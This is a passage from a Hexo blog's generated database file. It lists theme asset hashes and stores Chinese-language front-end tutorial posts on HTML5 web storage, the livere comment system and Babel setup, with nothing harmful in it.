895d8adcbc3de9c552f4a22b","modified":1520244769116},{"_id":"themes/yvshare/source/icons/snyk.svg","hash":"eba3b1873268236dcfe3b94b68218a36dcc0c3a3","modified":1520244769116},{"_id":"themes/yvshare/source/icons/smarty.svg","hash":"a7f764357ef21e784aa1e8e0cc2e938b4ca2c7c2","modified":1520244769116},{"_id":"themes/yvshare/source/icons/solidity.svg","hash":"961bf53c79cd397ed06aaa62a754e3896b272184","modified":1520244769116},{"_id":"themes/yvshare/source/icons/slim.svg","hash":"db7c4dc8a4230139a4191df6c59876da3ffb6216","modified":1520244769116},{"_id":"themes/yvshare/source/icons/rust.svg","hash":"c754fb91e2a595212416b1bfbb0c131b1f44332e","modified":1520244769116},{"_id":"themes/yvshare/source/icons/rollup.svg","hash":"675af84267629e71b8b3c2362ef864c57eff15a1","modified":1520244769116},{"_id":"themes/yvshare/source/icons/sonar.svg","hash":"444ca2de776352b5533545afa0ce4f6c3ed57faa","modified":1520244769116},{"_id":"themes/yvshare/source/icons/stylelint_light.svg","hash":"6a70e16e5aa4e22bafe5364e50aaf82ccd594cbe","modified":1520244769116},{"_id":"themes/yvshare/source/icons/stylelint.svg","hash":"17eac6d2e8b8ef21323ffd8760b366e777333757","modified":1520244769116},{"_id":"themes/yvshare/source/icons/stylus.svg","hash":"2ff53e5615622739e05a28d9fda350f8a6894f5f","modified":1520244769116},{"_id":"themes/yvshare/source/icons/table.svg","hash":"61d73cdd81075be3833b7edfb7073b0f395ebc4a","modified":1520244769116},{"_id":"themes/yvshare/source/icons/sublime.svg","hash":"9f5bafd5fa1d26bc96d2b061aa6c8748bc12b505","modified":1520228940485},{"_id":"themes/yvshare/source/icons/swc.svg","hash":"fde6cbe034454e59111fd8a2eb67dcb70ac2a2d7","modified":1520244769116},{"_id":"themes/yvshare/source/icons/terraform.svg","hash":"7c36f35e1b320aba9b26ff84c2ce2d5091e90995","modified":1520244769116},{"_id":"themes/yvshare/source/icons/swift.svg","hash":"a91332b544fca06afecbee470d76b7428fdfa190","modified":1520244769116},{"_id":"themes/yvshare/source/icons/test-js.svg","hash":"6e0bcbe3e2a594e2042b1c39e6ec4cec932bdbcd","modified":1520244769116},{"_id":"themes/yvshare/source/icons/test-jsx.svg","hash":"e290796ed70fb12b6546796a721d6c3c5a6346b0","modified":1520244769120},{"_id":"themes/yvshare/source/icons/todo.svg","hash":"fb71f2ca84580fd88066deadff8a1fa2bc93fada","modified":1520244769121},{"_id":"themes/yvshare/source/icons/tune.svg","hash":"468fb75430b32c574b5e032b14c7d694ded67d03","modified":1520244769121},{"_id":"themes/yvshare/source/icons/tex.svg","hash":"c95b4f0e2fca47fd3a1436869efbe2029131b5d2","modified":1520244769121},{"_id":"themes/yvshare/source/icons/test-ts.svg","hash":"bd9772f9c99bf06be9963d48913a106fa5478040","modified":1520244769121},{"_id":"themes/yvshare/source/icons/url.svg","hash":"ed090a64df878bf83e1b98b0bc52f18c28cfd2e3","modified":1520244769121},{"_id":"themes/yvshare/source/icons/typescript-def.svg","hash":"be0602f0e1aa59b3d8d651ca910acdd00a8269ab","modified":1520244769121},{"_id":"themes/yvshare/source/icons/twig.svg","hash":"6064a353616f3efa2c945b7a11355034156deab6","modified":1520244769121},{"_id":"themes/yvshare/source/icons/typescript.svg","hash":"15c51ad6e364c194365b64582a7668b3841e2ff3","modified":1520244769121},{"_id":"themes/yvshare/source/icons/verilog.svg","hash":"35afcff49d443d158b0045271bc106a94a8818a5","modified":1520244769121},{"_id":"themes/yvshare/source/icons/video.svg","hash":"790fe9d8f1df8bb18e777c4ee5b062c38f8396d4","modified":1520244769121},{"_id":"themes/yvshare/source/icons/virtual.svg","hash":"2ee1768702dc0f0bccb03c1abdda30b316de556f","modified":1520244769121},{"_id":"themes/yvshare/source/icons/vscode.svg","hash":"57eac6a110328561ac14e867b48ecfe5162a23bd","modified":1520244769121},{"_id":"themes/yvshare/source/icons/visualstudio.svg","hash":"b567df32fdfa988a426026849f93668908c528d9","modified":1520244769121},{"_id":"themes/yvshare/source/icons/travis.svg","hash":"848f832b0223f6594891869f0d17e52c20289853","modified":1520244769121},{"_id":"themes/yvshare/source/icons/vue.svg","hash":"d54dad7a8ca9b8154c06da00becae6da6a5a38ff","modified":1520244769121},{"_id":"themes/yvshare/source/icons/wakatime_light.svg","hash":"0b24499daecf9e84aa9967e97841972a2276cdee","modified":1520244769121},{"_id":"themes/yvshare/source/icons/wakatime.svg","hash":"3aaa35197e23b1c39813d1067d9dbc8be2c33d88","modified":1520244769121},{"_id":"themes/yvshare/source/icons/watchman.svg","hash":"709642030891f16e1f4fa10a3451f8e691978647","modified":1520244769121},{"_id":"themes/yvshare/source/icons/vfl.svg","hash":"fc12952f9388ed6167f4e8eaedab0a8dd11eddef","modified":1520244769121},{"_id":"themes/yvshare/source/icons/webpack.svg","hash":"2edf9af451a5b5d7b88c89cef3dea7ab1749be05","modified":1520244769121},{"_id":"themes/yvshare/source/icons/yaml.svg","hash":"786c1358b697431fdd9d98d2328adc2619de4876","modified":1520244769122},{"_id":"themes/yvshare/source/icons/wolframlanguage.svg","hash":"9cbf5778619e0fe8975a02eb78fcb18e6c96a31e","modified":1520244769122},{"_id":"themes/yvshare/source/icons/xaml.svg","hash":"81a936442e7b0c2ff96a94dd0ffec55c62286a00","modified":1520244769122},{"_id":"themes/yvshare/source/icons/xml.svg","hash":"672e30cb425afbecd1c85c1edb9fb4c02c90c3b0","modified":1520244769122},{"_id":"themes/yvshare/source/icons/zip.svg","hash":"8199051f86d819cb441df239d6f85b9e6ef14ac2","modified":1520244769122},{"_id":"themes/yvshare/source/icons/word.svg","hash":"04901ff61446d69fe68966cf142dbe18976650d7","modified":1520244769122},{"_id":"themes/yvshare/source/icons/yang.svg","hash":"1e42a328a913a0b7414ef78ced8b257ef7c0cd1b","modified":1520244769122},{"_id":"themes/yvshare/source/js/jquery-migrate-1.2.1.min.js","hash":"743052320809514fb788fe1d3df37fc87ce90452","modified":1519982374529},{"_id":"themes/yvshare/source/icons/yarn.svg","hash":"43da24660caff42e37428b0fb3195667c490cff0","modified":1520244769122},{"_id":"themes/yvshare/source/js/common.js","hash":"758eda7b3714d78fcce5f7fa192a1eccc3cfef52","modified":1522148401838},{"_id":"themes/yvshare/source/js/jquery.appear.js","hash":"1f8067d7bd4c0bde30785e8016100f239e14394f","modified":1519982374529},{"_id":"themes/yvshare/source/js/thirdparty.js","hash":"8f3ec19488a23df218ccd3e8640901487be55d96","modified":1521773537526},{"_id":"themes/yvshare/source/js/viewer.min.js","hash":"006b10fcfc945c63c325cd662a47bd2d74483d15","modified":1520244769155},{"_id":"themes/yvshare/source/fonts/fontawesome-webfont.ttf","hash":"6225ccc4ec94d060f19efab97ca42d842845b949","modified":1519979914768},{"_id":"themes/yvshare/source/images/github2.png","hash":"4b121309981d2800d62b53aac386889d37f77c5d","modified":1520925820088},{"_id":"themes/yvshare/source/images/github3.png","hash":"644d28cf76679814032d598ef99c8fca16c7281a","modified":1520926285303},{"_id":"themes/yvshare/source/images/livere1.png","hash":"8ffceb875a5affb7a97bd40a92d9462603dc8315","modified":1520233461135},{"_id":"themes/yvshare/source/images/swiftype3.png","hash":"c9444a170ccb8e1c5e3154f82fcae79b5575b05a","modified":1520339703458},{"_id":"themes/yvshare/source/images/swiftype2.png","hash":"aa88b67d3e925b5a5e5b35be29c6e7bccd17e42a","modified":1520339667041},{"_id":"themes/yvshare/source/images/browser/firefox.png","hash":"232fe3dd8c7027fc5b976dbf728d9107b055012d","modified":1521187627389},{"_id":"themes/yvshare/source/images/browser/ie.png","hash":"ea710c897b93ce4a0577bc973b8709c0de33c96b","modified":1521187639227},{"_id":"themes/yvshare/source/images/github1.png","hash":"47993d99af31999c0b11dafe8839b8d4de9d9779","modified":1520925345900},{"_id":"themes/yvshare/source/images/livere.png","hash":"bd4f5ca11137c1af00764cceb5b452793b9b4642","modified":1520584783022},{"_id":"themes/yvshare/source/images/swiftype1.png","hash":"9d9d482d95103897c5a2dfa4e55d47b52bda3c6e","modified":1520339540460},{"_id":"themes/yvshare/source/images/browser/chrome.png","hash":"e90c5e49b48e78a4a0579fb01ff1620d3f2348d8","modified":1521187567974},{"_id":"themes/yvshare/source/images/browser/opera.png","hash":"9a901ad06924edeeb27d811620de6451219eb229","modified":1521187648262},{"_id":"themes/yvshare/source/images/browser/safari.png","hash":"55519676b8fef69510dd241e8afac72785754983","modified":1521187659146},{"_id":"themes/yvshare/source/images/swiftype.png","hash":"e8888cc7032282bb640ddf1a5fa1b3548feca904","modified":1520584906744},{"_id":"themes/yvshare/source/fonts/fontawesome-webfont.svg","hash":"cd980eab6db5fa57db670cb2e4278e67e1a4d6c9","modified":1519982374527},{"_id":"themes/yvshare/source/js/jquery.js","hash":"bfc05b695dfa4f23e11d04b84993585da7a764bf","modified":1519982374531}],"Category":[],"Data":[],"Page":[{"title":"about","date":"2018-02-26T10:36:38.000Z","_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2018-02-26 18:36:38\n---\n","updated":"2018-02-26T10:36:38.391Z","path":"about/index.html","comments":1,"layout":"page","_id":"cjfhshvsm0000s4c0og53cf0y","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"categories","date":"2018-03-27T03:23:43.000Z","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2018-03-27 11:23:43\n---\n","updated":"2018-03-27T03:43:31.448Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cjfhshvvh0025s4c0glkf1sne","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"标签","date":"2018-03-27T05:47:34.641Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 日期\ntype: \"tags\"\ncomments: false\n---","updated":"2018-03-27T05:47:34.641Z","path":"tags/index.html","_id":"cjfhshvvn0027s4c0jwe1bql6","layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"_content":"<div class=\"tags\">\n  \n</div>","source":"tags/index1.html","raw":"<div class=\"tags\">\n  \n</div>","date":"2018-03-27T05:47:34.641Z","updated":"2018-03-27T05:47:34.641Z","path":"tags/index1.html","_id":"cjfhshvvr002as4c0lb89fr9s","title":"","comments":1,"layout":"page","content":"<div class=\"tags\">\n  \n</div>","site":{"data":{}},"excerpt":"","more":"<div class=\"tags\">\n  \n</div>"}],"Post":[{"id":"0809004","title":"HTML5 存储 webStorage","date":"2017-02-12T09:56:48.000Z","_content":"\n`客户端存储数据的两个对象为：`\n- `localStorage` - 没有时间限制的数据存储\n- `sessionStorage` - 针对一个 session(会话) 的数据存储\n在使用 web 存储前，应检查浏览器是否支持 localStorage 和sessionStorage :\n```js\nif( typeof(Storage) !== \"undefined\" )\n{\n    // 是的! 支持 localStorage  sessionStorage 对象!\n    // your code\n} else {\n    // 抱歉! 不支持 web 存储。\n}\n```\n#### <a name=\"local\">1. localStorage 对象</a>\n- `localStorage` 对象存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。\n实例：\n```js\n// 存储\n// {\"name\": \"yssuo\"}\nlocalStorage.name=\"yasuo\";\n\n// 获取\nconsole.log(localStorage.name); // yasuo\n\n// 移除\nlocalStorage.removeItem(\"name\");\n\n// 再次获取\nconsole.log(localStorage.name); // undefined\n```\n![localstorage](/images/localstorage.png)\n\n#### <a name=\"local\">2. sessionStorage 对象</a>\n\n- `sessionStorage` 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。\n\n不管是 `localStorage`，还是 `sessionStorage`，可使用的API都相同，常用的有如下几个（以localStorage为例）：\n```js\n// 保存数据\nlocalStorage.setItem(key,value);\n// 读取数据\nlocalStorage.getItem(key);\n// 删除单个数据\nlocalStorage.removeItem(key);\n// 删除所有数据\nlocalStorage.clear();\n// 得到某个索引的key\nlocalStorage.key(index);\n```","source":"_posts/0809004_HTML5存储webStorage.md","raw":"---\nid: 0809004\ntitle: HTML5 存储 webStorage\ndate: 2017-02-12 17:56:48\ntags: \n    - HTML5\n    - sessionStorage\n    - localStorage\ncategories:\n---\n\n`客户端存储数据的两个对象为：`\n- `localStorage` - 没有时间限制的数据存储\n- `sessionStorage` - 针对一个 session(会话) 的数据存储\n在使用 web 存储前，应检查浏览器是否支持 localStorage 和sessionStorage :\n```js\nif( typeof(Storage) !== \"undefined\" )\n{\n    // 是的! 支持 localStorage  sessionStorage 对象!\n    // your code\n} else {\n    // 抱歉! 不支持 web 存储。\n}\n```\n#### <a name=\"local\">1. localStorage 对象</a>\n- `localStorage` 对象存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。\n实例：\n```js\n// 存储\n// {\"name\": \"yssuo\"}\nlocalStorage.name=\"yasuo\";\n\n// 获取\nconsole.log(localStorage.name); // yasuo\n\n// 移除\nlocalStorage.removeItem(\"name\");\n\n// 再次获取\nconsole.log(localStorage.name); // undefined\n```\n![localstorage](/images/localstorage.png)\n\n#### <a name=\"local\">2. sessionStorage 对象</a>\n\n- `sessionStorage` 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。\n\n不管是 `localStorage`，还是 `sessionStorage`，可使用的API都相同，常用的有如下几个（以localStorage为例）：\n```js\n// 保存数据\nlocalStorage.setItem(key,value);\n// 读取数据\nlocalStorage.getItem(key);\n// 删除单个数据\nlocalStorage.removeItem(key);\n// 删除所有数据\nlocalStorage.clear();\n// 得到某个索引的key\nlocalStorage.key(index);\n```","slug":"0809004_HTML5存储webStorage","published":1,"updated":"2018-03-26T12:14:35.996Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvsp0001s4c089vcnx79","content":"<p><code>客户端存储数据的两个对象为：</code></p>\n<ul>\n<li><code>localStorage</code> - 没有时间限制的数据存储</li>\n<li><code>sessionStorage</code> - 针对一个 session(会话) 的数据存储<br>在使用 web 存储前，应检查浏览器是否支持 localStorage 和sessionStorage :<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">typeof</span>(Storage) !== <span class=\"string\">\"undefined\"</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 是的! 支持 localStorage  sessionStorage 对象!</span></span><br><span class=\"line\">    <span class=\"comment\">// your code</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 抱歉! 不支持 web 存储。</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"1-localStorage-对象\"><a href=\"#1-localStorage-对象\" class=\"headerlink\" title=\"1. localStorage 对象\"></a><a name=\"local\">1. localStorage 对象</a></h4><ul>\n<li><code>localStorage</code> 对象存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。<br>实例：<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 存储</span></span><br><span class=\"line\"><span class=\"comment\">// &#123;\"name\": \"yssuo\"&#125;</span></span><br><span class=\"line\">localStorage.name=<span class=\"string\">\"yasuo\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 获取</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(localStorage.name); <span class=\"comment\">// yasuo</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 移除</span></span><br><span class=\"line\">localStorage.removeItem(<span class=\"string\">\"name\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 再次获取</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(localStorage.name); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"/images/localstorage.png\" alt=\"localstorage\"></p>\n<h4 id=\"2-sessionStorage-对象\"><a href=\"#2-sessionStorage-对象\" class=\"headerlink\" title=\"2. sessionStorage 对象\"></a><a name=\"local\">2. sessionStorage 对象</a></h4><ul>\n<li><code>sessionStorage</code> 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</li>\n</ul>\n<p>不管是 <code>localStorage</code>，还是 <code>sessionStorage</code>，可使用的API都相同，常用的有如下几个（以localStorage为例）：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 保存数据</span></span><br><span class=\"line\">localStorage.setItem(key,value);</span><br><span class=\"line\"><span class=\"comment\">// 读取数据</span></span><br><span class=\"line\">localStorage.getItem(key);</span><br><span class=\"line\"><span class=\"comment\">// 删除单个数据</span></span><br><span class=\"line\">localStorage.removeItem(key);</span><br><span class=\"line\"><span class=\"comment\">// 删除所有数据</span></span><br><span class=\"line\">localStorage.clear();</span><br><span class=\"line\"><span class=\"comment\">// 得到某个索引的key</span></span><br><span class=\"line\">localStorage.key(index);</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>客户端存储数据的两个对象为：</code></p>\n<ul>\n<li><code>localStorage</code> - 没有时间限制的数据存储</li>\n<li><code>sessionStorage</code> - 针对一个 session(会话) 的数据存储<br>在使用 web 存储前，应检查浏览器是否支持 localStorage 和sessionStorage :<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">typeof</span>(Storage) !== <span class=\"string\">\"undefined\"</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 是的! 支持 localStorage  sessionStorage 对象!</span></span><br><span class=\"line\">    <span class=\"comment\">// your code</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 抱歉! 不支持 web 存储。</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"1-localStorage-对象\"><a href=\"#1-localStorage-对象\" class=\"headerlink\" title=\"1. localStorage 对象\"></a><a name=\"local\">1. localStorage 对象</a></h4><ul>\n<li><code>localStorage</code> 对象存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。<br>实例：<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 存储</span></span><br><span class=\"line\"><span class=\"comment\">// &#123;\"name\": \"yssuo\"&#125;</span></span><br><span class=\"line\">localStorage.name=<span class=\"string\">\"yasuo\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 获取</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(localStorage.name); <span class=\"comment\">// yasuo</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 移除</span></span><br><span class=\"line\">localStorage.removeItem(<span class=\"string\">\"name\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 再次获取</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(localStorage.name); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"/images/localstorage.png\" alt=\"localstorage\"></p>\n<h4 id=\"2-sessionStorage-对象\"><a href=\"#2-sessionStorage-对象\" class=\"headerlink\" title=\"2. sessionStorage 对象\"></a><a name=\"local\">2. sessionStorage 对象</a></h4><ul>\n<li><code>sessionStorage</code> 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</li>\n</ul>\n<p>不管是 <code>localStorage</code>，还是 <code>sessionStorage</code>，可使用的API都相同，常用的有如下几个（以localStorage为例）：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 保存数据</span></span><br><span class=\"line\">localStorage.setItem(key,value);</span><br><span class=\"line\"><span class=\"comment\">// 读取数据</span></span><br><span class=\"line\">localStorage.getItem(key);</span><br><span class=\"line\"><span class=\"comment\">// 删除单个数据</span></span><br><span class=\"line\">localStorage.removeItem(key);</span><br><span class=\"line\"><span class=\"comment\">// 删除所有数据</span></span><br><span class=\"line\">localStorage.clear();</span><br><span class=\"line\"><span class=\"comment\">// 得到某个索引的key</span></span><br><span class=\"line\">localStorage.key(index);</span><br></pre></td></tr></table></figure></p>\n"},{"id":"0809003","title":"在 hexo 中部署 livere 评论系统","date":"2018-01-06T07:05:00.000Z","_content":"\n- 注册来必力账号\n\n这一步很简单，进去[官网](https://livere.com/)，注册账号：\n![注册](/images/livere.png)\n\n然后点击右上角图标进入到管理页面，点击左侧的代码管理，这里面就是部署livere需要的脚本了：\n![获取部署代码](/images/livere1.png)\n\n- 用户登录账号设置\n\nlivere 评论系统里支持非常多的第三方账号登录方式：\n![账号](/images/livere2.png)\n可以根据自己的需要选择适用的方式。\n\n- 主题设置\n\nlivere 同样提供多种颜色主题，供用户免费使用：\n![主题](/images/livere3.png)\n\n`来必力livere部署起来其实是非常简单的，更多细节可以去`[官网](https://livere.com/)`查看更多`","source":"_posts/0809003_在hexo中部署livere评论系统.md","raw":"---\nid: 0809003\ntitle: 在 hexo 中部署 livere 评论系统\ndate: 2018-01-06 15:05:00\ntags: \n    - JavaScript\n    - livere\ncategories:\n---\n\n- 注册来必力账号\n\n这一步很简单，进去[官网](https://livere.com/)，注册账号：\n![注册](/images/livere.png)\n\n然后点击右上角图标进入到管理页面，点击左侧的代码管理，这里面就是部署livere需要的脚本了：\n![获取部署代码](/images/livere1.png)\n\n- 用户登录账号设置\n\nlivere 评论系统里支持非常多的第三方账号登录方式：\n![账号](/images/livere2.png)\n可以根据自己的需要选择适用的方式。\n\n- 主题设置\n\nlivere 同样提供多种颜色主题，供用户免费使用：\n![主题](/images/livere3.png)\n\n`来必力livere部署起来其实是非常简单的，更多细节可以去`[官网](https://livere.com/)`查看更多`","slug":"0809003_在hexo中部署livere评论系统","published":1,"updated":"2018-03-26T12:13:22.834Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvt00002s4c0tv6wxcew","content":"<ul>\n<li>注册来必力账号</li>\n</ul>\n<p>这一步很简单，进去<a href=\"https://livere.com/\" target=\"_blank\" rel=\"noopener\">官网</a>，注册账号：<br><img src=\"/images/livere.png\" alt=\"注册\"></p>\n<p>然后点击右上角图标进入到管理页面，点击左侧的代码管理，这里面就是部署livere需要的脚本了：<br><img src=\"/images/livere1.png\" alt=\"获取部署代码\"></p>\n<ul>\n<li>用户登录账号设置</li>\n</ul>\n<p>livere 评论系统里支持非常多的第三方账号登录方式：<br><img src=\"/images/livere2.png\" alt=\"账号\"><br>可以根据自己的需要选择适用的方式。</p>\n<ul>\n<li>主题设置</li>\n</ul>\n<p>livere 同样提供多种颜色主题，供用户免费使用：<br><img src=\"/images/livere3.png\" alt=\"主题\"></p>\n<p><code>来必力livere部署起来其实是非常简单的，更多细节可以去</code><a href=\"https://livere.com/\" target=\"_blank\" rel=\"noopener\">官网</a><code>查看更多</code></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>注册来必力账号</li>\n</ul>\n<p>这一步很简单，进去<a href=\"https://livere.com/\" target=\"_blank\" rel=\"noopener\">官网</a>，注册账号：<br><img src=\"/images/livere.png\" alt=\"注册\"></p>\n<p>然后点击右上角图标进入到管理页面，点击左侧的代码管理，这里面就是部署livere需要的脚本了：<br><img src=\"/images/livere1.png\" alt=\"获取部署代码\"></p>\n<ul>\n<li>用户登录账号设置</li>\n</ul>\n<p>livere 评论系统里支持非常多的第三方账号登录方式：<br><img src=\"/images/livere2.png\" alt=\"账号\"><br>可以根据自己的需要选择适用的方式。</p>\n<ul>\n<li>主题设置</li>\n</ul>\n<p>livere 同样提供多种颜色主题，供用户免费使用：<br><img src=\"/images/livere3.png\" alt=\"主题\"></p>\n<p><code>来必力livere部署起来其实是非常简单的，更多细节可以去</code><a href=\"https://livere.com/\" target=\"_blank\" rel=\"noopener\">官网</a><code>查看更多</code></p>\n"},{"id":"0809001","title":"test","date":"2016-09-09T12:56:46.000Z","_content":"\n- test","source":"_posts/0809001_test.md","raw":"---\nid: 0809001\ntitle: test\ndate: 2016-09-09 20:56:46\ntags: \n    - test\n---\n\n- test","slug":"0809001_test","published":1,"updated":"2018-03-23T02:50:40.357Z","_id":"cjfhshvt60004s4c0cyosrh0h","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li>test</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>test</li>\n</ul>\n"},{"id":"0809007","title":"记一次在公司中配置 Babel 的经历","date":"2017-10-05T05:46:10.000Z","_content":"\n- <a href=\"#install\">安装</a>\n- <a href=\"#usage\">使用</a>\n- <a href=\"#babelrc\">创建.babelrc文件</a>\n- <a href=\"#polyfill\">Babel-Polyfill</a>\n- <a href=\"#register\">Babel-Register</a>\n\n&emsp;首先，为什么会写这样一篇文章呢？在进入公司几个月后，写业务代码都是使用es5语法，es6，于是想着使用Babel来构建一下。这样既可以愉快的使用ES6了，还能舒心的写代码，何乐而不为。\n\n- Babel的使用是基于Node.js环境的，所以必须先安装Node。\n- 我们将采用通过安装babel-cli的方式来使用babel。\n\n#### <a name=\"install\">1. 安装</a>\n&emsp;虽然你可以在你的机器上全局安装`Babel CLI`, 但根据单个项目进行本地安装会更好一些。这样做有两个主要的原因：\n* 同一机器上的不同的项目可以依赖不同版本的 Babel, 这允许你一次更新一个项目。\n* 这意味着在你的工作环境中没有隐含的依赖项。它将使你的项目更方便移植、更易于安装。\n\n> 首先我们需要生成一个package.json文件，进入到项目目录执行`npm init`命令，随后一顿选择回车。\n\n```bash\nYSY@SY-YU MINGW64 /d/START/webpack\n$ npm init\nThis utility will walk you through creating a package.json file.\nIt only covers the most common items, and tries to guess sensible defaults.\n\nSee `npm help json` for definitive documentation on these fields\nand exactly what they do.\n\nUse `npm install <pkg>` afterwards to install a package and\nsave it as a dependency in the package.json file.\n\nPress ^C at any time to quit.\npackage name: (webpack)\n```\n*最后，目录下会生成一个package.json文件，打开看一下*\n```json\n{\n  \"name\": \"webpack\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"author\": \"yvshare.cn\",\n  \"license\": \"ISC\"\n}\n```\n*里面都是刚才npm init时自己的配置*\n\n> 我们可以通过以下命令本地安装 Babel CLI:\n\n```bash\n// 全局安装\nnpm install babel-cli -g\n// 安装在当前项目中\nnpm install --save-dev babel-cli\n```\n我们在当前目录安装babel-cli，随后我们的package.json应该长这个样：\n```json\n{\n  \"name\": \"webpack\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"author\": \"yvshare.cn\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"babel-cli\": \"^6.26.0\"\n  }\n}\n```\n\n#### <a name=\"usage\">2. 使用</a>\n- 我们将把我们的指令放在本地版本的 npm 脚本中，而不是直接通过命令行来运行 Babel.\n\n> 简单的在你的 package.json 中添加一个 \"scripts\" 属性并将 babel 命令放在它的 build 属性中：\n\n```json\n  {\n    \"name\": \"webpack\",\n    \"version\": \"1.0.0\",\n    \"scripts\": {\n      \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n+     \"build\": \"babel src -d lib\"  // 加入这一句命令\n    },\n    \"devDependencies\": {\n      \"babel-cli\": \"^6.26.0\"\n    }\n  }\n```\n现在从我们的终端可以运行以下命令：\n```bash\nnpm run build\n```\n*这会按照和之前一样的方式来运行 Babel 并将输出放在 lib 目录下，唯一不同在于我们现在使用了一个本地拷贝。*\n> 值得注意的是在babel的build命令是可以在build属性中自行配置的，上面是把src目录下的脚本打包到lib目录中，你也可以打包单个文件...\n\n#### <a name=\"babelrc\">3. 创建.babelrc配置文件</a>\n\n- 虽然已经配置好了 Babel ，但并没有让它真正生效。在项目的根目录中创建一个 .babelrc 